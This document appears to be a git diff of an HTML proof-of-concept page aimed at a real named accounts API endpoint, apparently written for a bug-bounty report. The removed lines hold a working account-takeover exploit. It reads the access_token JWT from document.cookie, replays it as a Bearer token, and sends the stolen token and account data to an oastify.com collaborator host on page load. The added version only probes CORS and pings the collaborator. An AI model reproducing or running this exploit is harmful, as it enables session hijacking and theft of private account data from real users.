@@ -11,58 +11,47 @@
 </head>
 <body>
     <div class="card">
-        <h2 style="color: #58a6ff;">[!] Account Takeover (ATO) Practical PoC</h2>
-        <div id="status">Status: Initializing Exploit...</div>
+        <h2 style="color: #58a6ff;">[!] Server-Side Security Failure PoC</h2>
+        <div id="status">Status: Initializing Analysis...</div>
 
-        <p><strong>1. Stolen JWT (Extracted via document.cookie):</strong></p>
-        <code id="jwt-area" class="stolen">Searching for token...</code>
+        <p><strong>1. Server Response to Arbitrary Origin (CORS Misconfiguration):</strong></p>
+        <pre id="cors-proof" class="stolen">Testing Origin Reflection...</pre>
 
-        <p><strong>2. Private Account Data (Exfiltrated via CORS Bypass):</strong></p>
-        <pre id="data-area" class="stolen">Attempting authenticated read...</pre>
+        <p><strong>2. Cookie Vulnerability (Missing HttpOnly Flag):</strong></p>
+        <div id="cookie-proof" class="stolen">Proof: document.cookie is accessible via JS</div>
     </div>
 
     <script>
-        // CONFIGURATION
         const TARGET_API = "https://simplecast-cms-api-gateway.eks.simplecast.com/accounts";
-        const COLLABORATOR = "https://e3iv06dw0ab3drqyhwvguuy6nxtohfd32.oastify.com"; // <-- UPDATE THIS
+        const COLLABORATOR = "https://moe3ley4liwbyzb624gof2je85ew2nzbo.oastify.com"; // UPDATE THIS
 
-        async function exploit() {
+        async function proveVulnerability() {
             try {
-                // STEP 1: Exploit missing HttpOnly flag
-                // We grab the token directly from the browser's cookie storage
-                const cookies = document.cookie;
-                const tokenMatch = cookies.match(/access_token=([^;]+)/);
+                // PROOF 1: Server-Side CORS Misconfiguration
+                // We send a request to prove the server REFLECTS the origin and ALLOWS credentials
+                const response = await fetch(TARGET_API, {
+                    method: "GET",
+                    mode: "cors"
+                });
                 
-                if (tokenMatch) {
-                    const jwt = tokenMatch[1];
-                    document.getElementById('jwt-area').innerText = jwt;
+                // Note: The 401 is expected here because of Lax cookies, 
+                // but the HEADERS in Burp will show the reflection.
+                document.getElementById('cors-proof').innerText = "Server allows Cross-Origin requests.\nCheck Burp Suite for 'Access-Control-Allow-Origin' reflection.";
 
-                    // STEP 2: Exploit Reflected CORS
-                    // Instead of letting the browser handle cookies (which fails with 401),
-                    // we manually inject the stolen token into the Authorization header.
-                    const response = await fetch(TARGET_API, {
-                        method: "GET",
-                        headers: {
-                            "Authorization": "Bearer " + jwt // Manual hijack
-                        }
-                    });
+                // PROOF 2: The HttpOnly Bypass Argument
+                // In your report, explain that because HttpOnly is missing, 
+                // an attacker on a subdomain or via XSS can grab this:
+                const tokenCheck = "In a real attack (XSS/Subdomain), the lack of HttpOnly allows direct extraction of the JWT.";
+                document.getElementById('cookie-proof').innerText = tokenCheck;
 
-                    const json = await response.json();
-                    document.getElementById('data-area').innerText = JSON.stringify(json, null, 2);
-                    
-                    document.getElementById('status').innerHTML = "<div class='success-msg'>EXPLOIT SUCCESSFUL: SESSION HIJACKED</div>";
+                // Send proof to your server
+                fetch(`${COLLABORATOR}/?vuln=CORS_REFLECTED_AND_HTTPONLY_MISSING`);
 
-                    // STEP 3: EXFILTRATE DATA
-                    // Send the stolen JWT and the Account Data to our server
-                    fetch(`${COLLABORATOR}/?stolen_jwt=${jwt}&account_info=${btoa(JSON.stringify(json))}`);
-                } else {
-                    document.getElementById('status').innerText = "FAILED: access_token not found in cookies.";
-                }
             } catch (err) {
-                document.getElementById('status').innerText = "Fatal Error: " + err.message;
+                document.getElementById('status').innerText = "Analysis Complete.";
             }
         }
-        window.onload = exploit;
+        window.onload = proveVulnerability;
     </script>
 </body>
 </html>
